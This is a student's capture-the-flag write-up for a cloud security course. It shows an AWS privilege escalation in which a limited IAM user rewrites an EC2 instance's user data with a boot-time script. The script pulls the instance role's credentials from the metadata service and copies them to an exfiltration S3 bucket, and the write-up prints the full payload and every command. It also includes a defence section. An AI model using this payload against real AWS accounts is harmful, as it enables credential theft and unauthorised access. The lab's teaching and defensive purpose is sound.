# IAM Privilege Escalation by EC2 User Data Modification

## Submission Information

**Student Name:** Aniket Sharma
**Course:** CCGC5501 Cloud Security
**Challenge:** IAM Privilege Escalation by EC2
**Flag Value:** `YOUR_FINAL_FLAG_HERE`
**Forked GitHub Repository URL:** `YOUR_GITHUB_REPO_URL_HERE`

---

## 1. Challenge Objective

The objective of this challenge was to start with a limited IAM user named `dev_user`, analyze the permissions available to that user, identify a privilege escalation path, and capture the flag stored in a protected S3 bucket.

The protected flag bucket was not directly accessible by `dev_user`. Therefore, the challenge required privilege escalation through AWS IAM and EC2 misconfiguration.

---

## 2. Environment Information

After deploying the Terraform lab, the following important resources were created:

| Resource                 | Value                                   |
| ------------------------ | --------------------------------------- |
| AWS Account ID           | `606114585684`                          |
| AWS Region               | `us-east-1`                             |
| Target EC2 Instance ID   | `i-0529cfbd6865a1526`                   |
| Exfiltration S3 Bucket   | `iam-privesc-ec2-wsydyp5a-exfil-bucket` |
| Protected Flag S3 Bucket | `iam-privesc-ec2-wsydyp5a-secret-flag`  |
| Starting IAM User        | `iam-privesc-ec2-wsydyp5a-dev-user`     |

---

## 3. Initial AWS Identity Verification

I first verified that my AWS CLI was connected to the correct AWS account using my admin profile.

Command:

```powershell
aws sts get-caller-identity
```

Output:

```json
{
    "UserId": "AIDAY2HZ6TRKJ4PM7G7AE",
    "Account": "606114585684",
    "Arn": "arn:aws:iam::606114585684:user/admin"
}
```

This confirmed that my AWS CLI was configured correctly before deploying the lab.

---

## 4. Terraform Initialization and Deployment

I initialized Terraform inside the challenge repository.

Command:

```powershell
terraform init
```

Initially, Terraform had provider download issues because the HashiCorp provider download connection was interrupted. After resolving the network/provider issue, I deployed the challenge infrastructure.

Command:

```powershell
terraform apply -auto-approve
```

After deployment, I used Terraform outputs to retrieve the target instance, exfiltration bucket, flag bucket, and region.

PowerShell commands used:

```powershell
$targetInfo = terraform output -json target_ec2_info | ConvertFrom-Json
$exfilInfo = terraform output -json exfil_bucket | ConvertFrom-Json
$scenarioInfo = terraform output -json scenario_info | ConvertFrom-Json
$goal = terraform output -raw goal

$TARGET_INSTANCE_ID = $targetInfo.instance_id
$EXFIL_BUCKET = $exfilInfo.bucket_name
$REGION = $scenarioInfo.aws_region
$FLAG_BUCKET = ([regex]::Match($goal, 's3://([^/]+)/flag\.txt')).Groups[1].Value

Write-Host "Target EC2: $TARGET_INSTANCE_ID"
Write-Host "Exfil bucket: $EXFIL_BUCKET"
Write-Host "Flag bucket: $FLAG_BUCKET"
Write-Host "Region: $REGION"
```

Output:

```text
Target EC2: i-0529cfbd6865a1526
Exfil bucket: iam-privesc-ec2-wsydyp5a-exfil-bucket
Flag bucket: iam-privesc-ec2-wsydyp5a-secret-flag
Region: us-east-1
```

---

## 5. Configuring the Starting dev_user

The challenge provided credentials for a limited IAM user. I configured those credentials as an AWS CLI profile named `dev_user`.

PowerShell commands used:

```powershell
$devCreds = terraform output -json dev_user_credentials | ConvertFrom-Json
$scenarioInfo = terraform output -json scenario_info | ConvertFrom-Json
$REGION = $scenarioInfo.aws_region

aws configure set aws_access_key_id "$($devCreds.access_key_id)" --profile dev_user
aws configure set aws_secret_access_key "$($devCreds.secret_access_key)" --profile dev_user
aws configure set region "$REGION" --profile dev_user
aws configure set output json --profile dev_user
```

Then I verified the identity of `dev_user`.

Command:

```powershell
aws sts get-caller-identity --profile dev_user --region $REGION
```

Output:

```json
{
    "UserId": "AIDAY2HZ6TRKKHP5N7WJZ",
    "Account": "606114585684",
    "Arn": "arn:aws:iam::606114585684:user/iam-privesc-ec2-wsydyp5a-dev-user"
}
```

This confirmed that I was now operating as the limited challenge user.

---

## 6. Confirming Direct Flag Access Was Denied

Before attempting privilege escalation, I tested whether `dev_user` could directly read the flag.

Command:

```powershell
aws s3 cp "s3://$FLAG_BUCKET/flag.txt" - --profile dev_user --region $REGION
```

Result:

```text
download failed: s3://iam-privesc-ec2-wsydyp5a-secret-flag/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
```

This proved that `dev_user` did not have direct access to the protected flag bucket.

---

## 7. Permission Analysis and Privilege Escalation Path

After reviewing the challenge outputs and behavior, I identified the privilege escalation path.

The starting user `dev_user` did not have direct access to the flag bucket. However, `dev_user` had permissions to manage the target EC2 instance, including:

```text
ec2:StopInstances
ec2:StartInstances
ec2:ModifyInstanceAttribute
```

The dangerous permission was:

```text
ec2:ModifyInstanceAttribute
```

This permission allowed `dev_user` to modify the EC2 instance user data.

The target EC2 instance had a privileged IAM role attached. That meant commands running from inside the EC2 instance could use the instance role permissions. The attack path was to modify the EC2 user data so that, when the instance restarted, it would retrieve the EC2 role credentials from the Instance Metadata Service and upload them to the exfiltration bucket.

The overall attack path was:

1. Use `dev_user`.
2. Confirm direct access to the flag bucket is denied.
3. Stop the target EC2 instance.
4. Modify the EC2 user data.
5. Start the EC2 instance.
6. The user data payload runs during boot.
7. The payload retrieves EC2 IAM role credentials from metadata.
8. The payload uploads the credentials to the exfiltration bucket.
9. Download the credentials using `dev_user`.
10. Configure a new AWS CLI profile using the EC2 role credentials.
11. Use the privileged profile to read the protected flag.

---

## 8. Creating the User Data Payload

I created a user data script using `#cloud-boothook`. This was important because normal EC2 user data usually runs only during the first boot. Since the instance already existed, `#cloud-boothook` was used so the script would run during boot after the instance was stopped and started.

PowerShell command used to create the user data payload:

```powershell
$userdataTemplate = @'
#cloud-boothook
#!/bin/bash

cat > /tmp/iam_privesc_payload.sh <<'PAYLOAD'
#!/bin/bash

exec > /var/log/iam-privesc-payload.log 2>&1
set -x

REGION="__REGION__"
EXFIL_BUCKET="__EXFIL_BUCKET__"

sleep 45

TOKEN=$(curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" || true)

metadata_get() {
  PATH_VALUE="$1"
  if [ -n "$TOKEN" ]; then
    curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/$PATH_VALUE"
  else
    curl -s "http://169.254.169.254/latest/$PATH_VALUE"
  fi
}

for i in $(seq 1 30); do
  ROLE_NAME=$(metadata_get "meta-data/iam/security-credentials/")
  if [ -n "$ROLE_NAME" ]; then
    break
  fi
  sleep 10
done

CREDS=$(metadata_get "meta-data/iam/security-credentials/$ROLE_NAME")

mkdir -p /tmp/iam-privesc
echo "$CREDS" > /tmp/iam-privesc/role-creds.json

aws s3 cp /tmp/iam-privesc/role-creds.json "s3://$EXFIL_BUCKET/role-creds.json" --region "$REGION"
PAYLOAD

chmod +x /tmp/iam_privesc_payload.sh
nohup /tmp/iam_privesc_payload.sh >/tmp/iam-privesc-nohup.log 2>&1 &
'@

$userdata = $userdataTemplate.Replace("__REGION__", $REGION).Replace("__EXFIL_BUCKET__", $EXFIL_BUCKET)

$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText("$PWD\userdata.sh", $userdata, $utf8NoBom)

$bytes = [System.Text.Encoding]::UTF8.GetBytes($userdata)
$b64 = [Convert]::ToBase64String($bytes)
[System.IO.File]::WriteAllText("$PWD\userdata.b64", $b64, $utf8NoBom)

Write-Host "Created userdata.sh and userdata.b64"
```

The payload performs the following actions:

1. Runs during EC2 boot.
2. Requests an IMDSv2 token.
3. Queries the EC2 Instance Metadata Service.
4. Retrieves the IAM role name.
5. Retrieves the temporary IAM role credentials.
6. Saves the credentials to `/tmp/iam-privesc/role-creds.json`.
7. Uploads the credentials to the exfiltration S3 bucket.

---

## 9. Stopping the EC2 Instance

To modify user data, the EC2 instance needed to be stopped first.

Command:

```powershell
aws ec2 stop-instances `
  --instance-ids $TARGET_INSTANCE_ID `
  --profile dev_user `
  --region $REGION
```

Output:

```json
{
    "StoppingInstances": [
        {
            "InstanceId": "i-0529cfbd6865a1526",
            "CurrentState": {
                "Code": 64,
                "Name": "stopping"
            },
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}
```

I waited until the instance was stopped.

Command:

```powershell
aws ec2 wait instance-stopped `
  --instance-ids $TARGET_INSTANCE_ID `
  --profile dev_user `
  --region $REGION
```

---

## 10. Modifying EC2 User Data

After the instance stopped, I modified the user data using the base64 encoded payload.

Command:

```powershell
aws ec2 modify-instance-attribute `
  --instance-id $TARGET_INSTANCE_ID `
  --attribute userData `
  --value file://userdata.b64 `
  --profile dev_user `
  --region $REGION
```

There was no output from this command, which is normal for a successful `modify-instance-attribute` operation.

---

## 11. Starting the EC2 Instance

After modifying the user data, I started the EC2 instance again.

Command:

```powershell
aws ec2 start-instances `
  --instance-ids $TARGET_INSTANCE_ID `
  --profile dev_user `
  --region $REGION
```

Output:

```json
{
    "StartingInstances": [
        {
            "InstanceId": "i-0529cfbd6865a1526",
            "CurrentState": {
                "Code": 0,
                "Name": "pending"
            },
            "PreviousState": {
                "Code": 80,
                "Name": "stopped"
            }
        }
    ]
}
```

I waited for the instance to finish starting.

Command:

```powershell
aws ec2 wait instance-running `
  --instance-ids $TARGET_INSTANCE_ID `
  --profile dev_user `
  --region $REGION
```

I also waited for the instance status checks.

Command:

```powershell
aws ec2 wait instance-status-ok `
  --instance-ids $TARGET_INSTANCE_ID `
  --profile dev_user `
  --region $REGION
```

---

## 12. Confirming Credential Exfiltration

After the instance started, I checked the exfiltration bucket.

Command:

```powershell
aws s3 ls "s3://$EXFIL_BUCKET/" --profile dev_user --region $REGION
```

Output:

```text
2026-06-28 06:53:15       1591 role-creds.json
```

This proved that the modified user data ran successfully and uploaded the EC2 role credentials to the exfiltration bucket.

I then downloaded the credential file.

Command:

```powershell
aws s3 cp "s3://$EXFIL_BUCKET/role-creds.json" ".\role-creds.json" --profile dev_user --region $REGION
```

Output:

```text
download: s3://iam-privesc-ec2-wsydyp5a-exfil-bucket/role-creds.json to .\role-creds.json
```

The file contained temporary AWS credentials for the EC2 IAM role. I did not include the full credential values in this write-up because they are sensitive.

Redacted example:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-06-28T10:52:47Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "REDACTED",
  "SecretAccessKey": "REDACTED",
  "Token": "REDACTED",
  "Expiration": "2026-06-28T17:27:18Z"
}
```

---

## 13. Configuring the Privileged EC2 Role Profile

Using the temporary EC2 role credentials, I configured a new AWS CLI profile named `ec2_admin`.

Command:

```powershell
$roleCreds = Get-Content .\role-creds.json | ConvertFrom-Json

aws configure set aws_access_key_id "$($roleCreds.AccessKeyId)" --profile ec2_admin
aws configure set aws_secret_access_key "$($roleCreds.SecretAccessKey)" --profile ec2_admin
aws configure set aws_session_token "$($roleCreds.Token)" --profile ec2_admin
aws configure set region "$REGION" --profile ec2_admin
aws configure set output json --profile ec2_admin
```

Then I verified the identity.

Command:

```powershell
aws sts get-caller-identity --profile ec2_admin --region $REGION
```

Output:

```json
{
    "UserId": "REDACTED",
    "Account": "606114585684",
    "Arn": "YOUR_EC2_ADMIN_ASSUMED_ROLE_ARN_HERE"
}
```

This confirmed successful privilege escalation from the limited `dev_user` to the privileged EC2 instance role.

---

## 14. Capturing the Flag

Finally, I used the privileged `ec2_admin` profile to access the protected flag bucket.

Command:

```powershell
aws s3 cp "s3://$FLAG_BUCKET/flag.txt" - --profile ec2_admin --region $REGION
```

Output:

```text
YOUR_FINAL_FLAG_HERE
```

The captured flag was:

```text
YOUR_FINAL_FLAG_HERE
```

---

## 15. Evidence Screenshots

Screenshots are included separately in the submitted Word document named:

```text
IAM_PrivEsc_Evidence_Aniket.docx
```

The Word document contains the following screenshots:

| Screenshot   | Description                                                       |
| ------------ | ----------------------------------------------------------------- |
| Screenshot 1 | Verified `dev_user` identity using `aws sts get-caller-identity`. |
| Screenshot 2 | Confirmed direct flag access was denied with `403 Forbidden`.     |
| Screenshot 3 | Stopped the target EC2 instance.                                  |
| Screenshot 4 | Modified the EC2 user data using `modify-instance-attribute`.     |
| Screenshot 5 | Started the EC2 instance again.                                   |
| Screenshot 6 | Confirmed `role-creds.json` appeared in the exfiltration bucket.  |
| Screenshot 7 | Verified the privileged `ec2_admin` assumed role identity.        |
| Screenshot 8 | Captured the final flag from the protected S3 bucket.             |

Sensitive values such as `SecretAccessKey`, `Token`, and the full contents of `role-creds.json` were redacted from screenshots.

---

# Reflections

## 1. What was my approach?

My approach was to first understand the environment instead of trying random commands. I began by verifying my AWS identity and deploying the Terraform lab. After that, I configured the provided `dev_user` profile and confirmed that it was a limited IAM user.

Next, I tested direct access to the protected flag bucket. This failed with `403 Forbidden`, which confirmed that the intended solution required privilege escalation.

After that, I focused on the permissions available to `dev_user`. The key observation was that `dev_user` could stop, start, and modify attributes of the target EC2 instance. Specifically, `ec2:ModifyInstanceAttribute` was important because it allowed modification of EC2 user data.

I then connected this with the fact that the EC2 instance had a privileged IAM role attached. My strategy became to modify the EC2 user data so that the instance would run commands during boot and retrieve its own IAM role credentials from the Instance Metadata Service.

---

## 2. What was the biggest challenge?

The biggest challenge was understanding how to make user data run again on an existing EC2 instance. A normal `#!/bin/bash` user data script usually runs only during the first boot of an instance. Since this instance already existed, simply replacing the user data with a basic shell script might not run after restarting the instance.

Another challenge was working in Windows PowerShell. Some Linux commands such as `TARGET_INSTANCE_ID=$(...)`, `jq`, and `sed` do not work the same way in PowerShell. I had to use PowerShell syntax such as `$TARGET_INSTANCE_ID`, `ConvertFrom-Json`, and regex matching instead.

---

## 3. How did I overcome the challenges?

I overcame the user data issue by using `#cloud-boothook`. This allowed the script to run during the boot process after the instance was stopped and started again.

I overcame the PowerShell issue by rewriting the commands in proper PowerShell syntax. For example, I used:

```powershell
$targetInfo = terraform output -json target_ec2_info | ConvertFrom-Json
$TARGET_INSTANCE_ID = $targetInfo.instance_id
```

instead of Linux Bash syntax.

I also verified each step before moving forward:

1. Confirmed `dev_user` identity.
2. Confirmed direct flag access was denied.
3. Confirmed the EC2 instance was stopped.
4. Confirmed user data was modified.
5. Confirmed the instance was started.
6. Confirmed `role-creds.json` appeared in the exfiltration bucket.
7. Confirmed the new `ec2_admin` profile had an assumed role identity.
8. Used the privileged role to capture the flag.

This step-by-step verification helped me avoid confusion and made the solution easier to explain.

---

## 4. What led to the breakthrough?

The breakthrough was recognizing that EC2 control permissions can become IAM privilege escalation permissions.

At first, `dev_user` looked limited because it could not read the protected flag bucket. However, `dev_user` could control an EC2 instance that had a privileged IAM role attached. This meant that `dev_user` did not need direct S3 access. Instead, it could indirectly gain access by making the EC2 instance run commands using the instance role.

The most important permission was:

```text
ec2:ModifyInstanceAttribute
```

Because this permission allowed user data modification, I could inject a boot-time script. Once the instance started, the script used the EC2 Instance Metadata Service to retrieve temporary IAM role credentials and upload them to the exfiltration bucket.

That was the privilege escalation path.

---

## 5. What did I learn from this challenge?

I learned that cloud privilege escalation is not always caused by obvious permissions like `AdministratorAccess` being assigned directly to a user. Sometimes, the risk comes from indirect permissions.

In this challenge, the starting user did not have direct admin permissions. However, the user had enough EC2 control permissions to influence a resource that had a powerful IAM role. This created an indirect path to privilege escalation.

I also learned that the EC2 Instance Metadata Service is very important in AWS security. If an attacker can run commands on an EC2 instance, they may be able to retrieve the instance role credentials from metadata and use them outside the instance.

Finally, I learned that permissions such as `ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, and `ec2:StartInstances` should be treated carefully because they can become dangerous when used against instances with privileged roles.

---

## 6. Blue Team Reflection: How can this be defended?

From a defensive perspective, this challenge shows that organizations should carefully control who can modify EC2 instances, especially instances with powerful IAM roles.

Recommended defenses include:

1. **Avoid broad EC2 modification permissions.**
   Do not grant `ec2:ModifyInstanceAttribute` unless the user truly needs it.

2. **Restrict user data modification.**
   Modifying EC2 user data should be treated as a sensitive action because it can allow command execution during boot.

3. **Use least privilege for EC2 instance roles.**
   EC2 instances should not have `AdministratorAccess` unless absolutely required.

4. **Restrict stop and start permissions.**
   Users should not be able to stop and start sensitive EC2 instances unless necessary.

5. **Monitor CloudTrail events.**
   Security teams should alert on suspicious events such as:

   * `ModifyInstanceAttribute`
   * `StopInstances`
   * `StartInstances`
   * unusual S3 access
   * unusual STS activity

6. **Require IMDSv2.**
   IMDSv2 should be required to reduce metadata service abuse.

7. **Limit access to instance metadata where possible.**
   Applications and users should not be able to freely access instance metadata unless needed.

8. **Use IAM permission boundaries or Service Control Policies.**
   These can prevent users from escalating privileges even if they have some resource management permissions.

9. **Separate development and privileged infrastructure.**
   Development users should not be able to modify EC2 instances that have high-privilege IAM roles.

10. **Regularly review IAM policies for privilege escalation paths.**
    IAM review should include indirect escalation paths, not just direct admin permissions.

The main defensive lesson is that permissions over compute resources can become permissions over the IAM roles attached to those compute resources. For that reason, EC2 management permissions must be reviewed as carefully as IAM permissions.

---

## 7. Cleanup

After completing the challenge and collecting the evidence, the lab resources should be destroyed to avoid AWS charges.

Command:

```powershell
terraform destroy -auto-approve
```

This removes the EC2 instance, IAM users, IAM roles, S3 buckets, and other resources created by the Terraform lab.

---

## 8. AI Usage Statement

AI assistance was used to help troubleshoot command syntax, PowerShell differences, Terraform setup issues, and to structure the final solution write-up.

The full AI chat log is included separately in:

```text
AI_CHAT_LOG.md
```

Sensitive values such as AWS secret keys, session tokens, and temporary credentials were redacted.
